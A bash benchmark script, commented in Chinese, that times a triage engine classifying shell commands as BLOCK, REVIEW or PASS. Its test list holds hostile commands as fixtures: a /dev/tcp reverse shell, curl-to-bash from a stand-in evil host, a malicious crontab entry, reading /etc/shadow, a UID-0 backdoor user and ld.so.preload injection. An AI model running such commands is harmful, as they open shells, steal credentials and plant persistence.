#!/usr/bin/env bash
# ============================================================================
#  性能基准测试 — 测量预判引擎吞吐量
#
#  用法:
#    ./benchmark.sh              # 默认 100 次迭代
#    ./benchmark.sh 500          # 指定迭代次数
#    ./benchmark.sh 100 --json   # JSON 输出
# ============================================================================
set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TRIAGE="${SCRIPT_DIR}/triage.sh"
ITERATIONS="${1:-100}"
JSON_OUTPUT=false
[ "${2:-}" = "--json" ] && JSON_OUTPUT=true

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# 测试用例集 (混合安全和恶意命令)
COMMANDS=(
    "echo hello world"
    "ls -la /"
    "git --version"
    "pip install requests"
    "curl -LsSf https://astral.sh/uv/install.sh | sh"
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    "echo 'reverse' >> ~/.bashrc"
    "cat /etc/shadow | base64"
    "useradd -o -u 0 backdoor"
    "docker build -t test ."
    "python3 -c \"print('hello')\""
    "chmod u+s /tmp/shell"
    "iptables -F"
    "date && uptime && whoami"
    "curl http://evil.test/malware | bash"
    "apt-get update -qq && apt-get install -y jq"
    "echo '* * * * * curl evil|bash' | crontab -"
    "make --version"
    "echo '/tmp/evil.so' > /etc/ld.so.preload"
    "go version"
)

NUM_CMDS=${#COMMANDS[@]}

if [ "$JSON_OUTPUT" = false ]; then
    echo ""
    echo -e "${BOLD}=========================================="
    echo "  Triage Engine Benchmark"
    echo -e "==========================================${NC}"
    echo ""
    echo "  迭代次数  : ${ITERATIONS}"
    echo "  命令数    : ${NUM_CMDS}"
    echo "  总执行    : $((ITERATIONS * NUM_CMDS)) 次预判"
    echo ""
fi

# 预热
for cmd in "${COMMANDS[@]}"; do
    COMMAND="$cmd" "$TRIAGE" > /dev/null 2>&1 || true
done

# 基准测试
START_TIME=$(date +%s%N)
TOTAL_RUNS=0
BLOCK_COUNT=0
REVIEW_COUNT=0
PASS_COUNT=0

for i in $(seq 1 "$ITERATIONS"); do
    for cmd in "${COMMANDS[@]}"; do
        COMMAND="$cmd" "$TRIAGE" > /tmp/.bench_result 2>/dev/null || true
        level=$(python3 -c "import json; print(json.load(open('/tmp/.bench_result'))['level'])" 2>/dev/null || echo "ERROR")
        TOTAL_RUNS=$((TOTAL_RUNS + 1))
        case "$level" in
            BLOCK)  BLOCK_COUNT=$((BLOCK_COUNT + 1)) ;;
            REVIEW) REVIEW_COUNT=$((REVIEW_COUNT + 1)) ;;
            PASS)   PASS_COUNT=$((PASS_COUNT + 1)) ;;
        esac
    done
done

END_TIME=$(date +%s%N)
ELAPSED_NS=$((END_TIME - START_TIME))
ELAPSED_MS=$((ELAPSED_NS / 1000000))
ELAPSED_S=$(python3 -c "print(f'{${ELAPSED_MS}/1000:.2f}')")
AVG_MS=$(python3 -c "print(f'{${ELAPSED_MS}/${TOTAL_RUNS}:.1f}')")
THROUGHPUT=$(python3 -c "print(f'{${TOTAL_RUNS}/(${ELAPSED_MS}/1000):.0f}')")

rm -f /tmp/.bench_result

if [ "$JSON_OUTPUT" = true ]; then
    cat <<EOJSON
{
  "iterations": ${ITERATIONS},
  "commands_per_iteration": ${NUM_CMDS},
  "total_runs": ${TOTAL_RUNS},
  "elapsed_ms": ${ELAPSED_MS},
  "avg_ms_per_triage": ${AVG_MS},
  "throughput_per_sec": ${THROUGHPUT},
  "results": {
    "block": ${BLOCK_COUNT},
    "review": ${REVIEW_COUNT},
    "pass": ${PASS_COUNT}
  }
}
EOJSON
else
    echo -e "${BOLD}  结果:${NC}"
    echo ""
    echo "  总耗时       : ${ELAPSED_S}s"
    echo "  总预判次数   : ${TOTAL_RUNS}"
    echo -e "  平均单次耗时 : ${CYAN}${AVG_MS}ms${NC}"
    echo -e "  吞吐量       : ${GREEN}${THROUGHPUT} 次/秒${NC}"
    echo ""
    echo "  判定分布:"
    echo -e "    BLOCK  : ${RED}${BLOCK_COUNT}${NC}"
    echo -e "    REVIEW : ${CYAN}${REVIEW_COUNT}${NC}"
    echo -e "    PASS   : ${GREEN}${PASS_COUNT}${NC}"
    echo ""

    # 性能等级
    AVG_INT=${AVG_MS%.*}
    if [ "$AVG_INT" -lt 50 ]; then
        echo -e "  性能等级: ${GREEN}${BOLD}S 级${NC} (< 50ms/次, 适合实时网关)"
    elif [ "$AVG_INT" -lt 100 ]; then
        echo -e "  性能等级: ${GREEN}A 级${NC} (< 100ms/次, 适合 API 集成)"
    elif [ "$AVG_INT" -lt 500 ]; then
        echo -e "  性能等级: ${CYAN}B 级${NC} (< 500ms/次, 适合 CI/CD)"
    else
        echo -e "  性能等级: ${RED}C 级${NC} (> 500ms/次, 需优化)"
    fi
    echo ""
fi
